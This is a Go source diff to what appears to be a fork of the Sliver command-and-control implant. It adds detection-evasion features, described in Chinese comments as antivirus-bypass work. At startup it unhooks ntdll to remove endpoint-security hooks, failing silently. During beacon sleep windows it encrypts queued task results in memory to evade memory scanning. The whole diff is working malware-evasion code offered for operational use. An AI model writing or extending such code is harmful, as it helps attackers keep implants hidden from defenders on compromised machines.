@@ -30,7 +30,11 @@ import (
 	"time"
 
 	// {{if .Config.IsBeacon}}
+	"bytes"
+	"encoding/binary"
 	"sync"
+
+	sleepcrypt "4zreco/sliver/implant/sliver/evasion/sleepcrypt"
 	// {{end}}
 
 	// {{if .Config.Debug}}
@@ -38,6 +42,7 @@ import (
 	// {{end}}
 
 	consts "4zreco/sliver/implant/sliver/constants"
+	"4zreco/sliver/implant/sliver/evasion"
 	"4zreco/sliver/implant/sliver/handlers"
 	"4zreco/sliver/implant/sliver/hostuuid"
 	"4zreco/sliver/implant/sliver/limits"
@@ -125,6 +130,12 @@ func Main() {
 	// {{end}}
 
 	limits.ExecLimits() // Check to see if we should execute
+
+	// 免杀 R-2：启动早期 ntdll 自恢复（抹平用户态 hook；size 失配/失败均静默，不影响存活）
+	func() {
+		defer func() { _ = recover() }()
+		_ = evasion.UnhookNtdll()
+	}()
 
 	// {{if .Config.IsService}}
 	svc.Run("", &sliverService{})
@@ -249,6 +260,61 @@ func (q *beaconResultQueue) prepend(results []*sliverpb.Envelope) {
 	q.results = combined
 }
 
+// sealPendingResults 未消费任务结果序列化加密（免杀 R-1a）：drain → proto.Marshal
+// → 帧化（4 字节小端长度 + envelope）→ sleepcrypt.Seal（Windows RtlEncryptMemory，
+// 系统托管密钥不落堆）。任一步失败还原队列并返回 not-ok（回落不加密路径，不影响回连）。
+// 非睡眠窗口的短暂数据与本边界无关：本函数只在长睡眠窗口前后调用。
+func sealPendingResults(q *beaconResultQueue) ([]byte, bool) {
+	results := q.drain()
+	if len(results) == 0 {
+		return nil, false
+	}
+	var framed bytes.Buffer
+	for _, env := range results {
+		data, err := proto.Marshal(env)
+		if err != nil {
+			q.prepend(results)
+			return nil, false
+		}
+		var l [4]byte
+		binary.LittleEndian.PutUint32(l[:], uint32(len(data)))
+		framed.Write(l[:])
+		framed.Write(data)
+	}
+	blob, err := sleepcrypt.Seal(framed.Bytes())
+	if err != nil {
+		q.prepend(results)
+		return nil, false
+	}
+	return blob, true
+}
+
+// unsealPendingResults 唤醒后解密还原任务结果队列。同进程系统密钥解密不应失败；
+// 失败视为密文损坏（该批结果丢失但不影响回连主链路），上游台账如实记录此边界。
+func unsealPendingResults(q *beaconResultQueue, blob []byte) {
+	if len(blob) == 0 {
+		return
+	}
+	plain, err := sleepcrypt.Unseal(blob)
+	if err != nil {
+		return
+	}
+	results := []*sliverpb.Envelope{}
+	for off := 0; off+4 <= len(plain); {
+		n := int(binary.LittleEndian.Uint32(plain[off : off+4]))
+		off += 4
+		if n <= 0 || off+n > len(plain) {
+			break
+		}
+		env := &sliverpb.Envelope{}
+		if uerr := proto.Unmarshal(plain[off:off+n], env); uerr == nil {
+			results = append(results, env)
+		}
+		off += n
+	}
+	q.prepend(results)
+}
+
 func beaconMainLoop(beacon *transports.Beacon, pendingResults *beaconResultQueue) error {
 	// Register beacon
 	err := beacon.Init()
@@ -324,7 +390,14 @@ func beaconCheckinLoop(beacon *transports.Beacon, pendingResults *beaconResultQu
 			// finishes before its deadline. If it overruns, begin the next
 			// check-in immediately without overlapping shared transport state.
 			if remaining := time.Until(nextCheckin); 0 < remaining {
-				time.Sleep(remaining)
+				// 免杀 R-1a：睡眠窗口加密未消费任务结果——堆上不留明文 envelope，
+				// 唤醒后解密还原队列；seal 失败回落不加密路径，不影响回连。
+				if sealed, sealedOK := sealPendingResults(pendingResults); sealedOK {
+					time.Sleep(remaining)
+					unsealPendingResults(pendingResults, sealed)
+				} else {
+					time.Sleep(remaining)
+				}
 			}
 		}
 
